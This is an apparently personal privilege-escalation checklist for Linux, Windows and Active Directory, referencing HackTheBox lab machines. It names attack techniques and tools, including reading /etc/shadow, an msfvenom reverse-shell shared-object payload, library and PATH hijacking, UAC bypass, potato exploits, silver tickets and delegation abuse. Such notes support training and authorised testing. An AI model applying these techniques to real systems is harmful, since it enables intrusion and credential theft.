
### **Linux:**
1. Check **sudo -l**
2. **LinPEAS**
3. **Horizontal privesc**!
4. Check **.bash_history**
5. Always check **/** directory
6. Check **SUID** binaries (carefully review all)
7. uname -a
8. **find** / -f filename
9. **find** / -u user
10. **find** / -writable
11. Try to find **processes** running for the next target user
12. netstat -ano (check for **local service**)
13. If local ports are open, try to **curl them locally**
14. Try to access user **home dirs** from **local web ports**
15. Check **HTTP** directory for **passwords**
16. Check **password reuse/null** password
17. Check **/etc/[service-config-files]** for other services found (web,ftp,etc)
18. /etc/passwd
19. /etc/shadow
20. **SNMP** can execute scripts with **NET-SNMP-EXTEND-MIB/ExtendObjects**, try to specify OID
HTB pit)
21. Drop a shell with "**bash**" **inside msfconsole**
22. If another user ssh is not working, try **password with su**
23. /etc/crontab (always check for **crontab** -l)
24. Check for **mongodb scheduled** tasks (node machine, rana khalil)
25. Use **env variables**/**wildcards**/**symlinks** when path/file name **filtering**
26. **Pspy** (process spy, for recurring processes, check build for 32/64 bit)
27. Python **library hijack** (create import file on the same dir)
28. Create **symlinks** for files (or subfiles if writeable) running in **cron jobs**
29. For a binary having BO, use **gdb** (check HTB Frolic)
30. **Check for groups** with id, and *find / -group [group] 2>/dev/null*
31. For **NetBSD**, **sudo = doas**
32. If **SETENV** is set in sudo, you can run the command with env variable value 
program path variables, library hijacking etc, see HTB admirer)
33. Change **$PATH** value to **execute elevated binaries** with the custom one in pwd/sudo scripts
34. If /usr/bin/**screen** is elevated, run screen -x [user]/[sess_id] (see HTB backdoor)
35. For **shared objects:**
a. msfvenom -p payload -f elf-so -o utils.so LHOST= LPORT=
b. Shared library path: **/usr/local/lib/dev**
c. Check for custom **LD_LIBRARY_PATH** variables set in crontab to place so files
36. For **shared library:**
a. Create **rootshell** c file
b. Check function name and return type (void, _init())
c. Check **header** files (stdlib, sys/types.h, stdio)
d. Common ports
e. Generic bash -I payload

### **Windows:**
1. Users\[user]\Desktop
38. **WinPEAS**
39. **Horizontal privesc**!
40. **UAC Bypass** (manual > msf > empire)
41. **powerup.ps1**
42. **Windows-exploit-suggester**
43. Check **powershell history** (winpeas)
44. Check **AlwaysInstallElevated** (winpeas sysinfo, create msf msi file)
45. Check **program files (x86)**
46. **JuicyPotatoNG** with **seimpersonate**
47. For windows <=2003, and SeImpersonate, use **Churrasco.exe** (github)
48. Look around the file system for **sensitive strings**
49. **reg query**
50. Check Program Files for installed apps
51. **sc query** list brief
52. **sc qc** *[service_name] (unquoted paths/autorun)*
53. **wmic** *service get name,startname*
54. **whoami** **/priv**
55. *net user* **/domain**
56. **tasklist**
57. **net localgroup** *user*
58. Check for other users, try to horizontal privesc (may have more privs)
59. Check for **LAPS** access
60. Check for files and folders **permissions** with **icacls**
61. Decrypt **PSCredential** with CLiXml (HTB Omni)
62. Use **psexec.exe** to upgrade to **SYSTEM** with **admin** privilege
63. Grant file permission inside a folder with **icacls /grant**
64. Use **printspoofer** for seimpersonate on **win 10/server 2019**, else juicypotato
65. Check **AlwaysInstallElevated** (can **execute any software package** installer with SYSTEM (e.g. **msi**)
66. Check for **WSL path** (rootfs)

### **Active Directory:**
1. **net user /domain**
2. Horizontal!
3. When found **other user creds**, run **service as another user** with powershell PSCredential and **Start-Process**
4. **cmdlist** for checking another user creds, use **runas** to login
5. Obtain kerberos tickets with **GetUserSPNs** with account details if **88** open
6. If a service account pass/hash is found, try **silver ticket** with **ticketer.py**/**mimikatz** kerberos
golden
7. If an account is allowed to **Delegate** to domain, we can request service tickets with **getST.py** *-impersonate administrator*, and **login** with *psexec -no-pass*
8. **ADPEAS**
9. **whoami /groups**

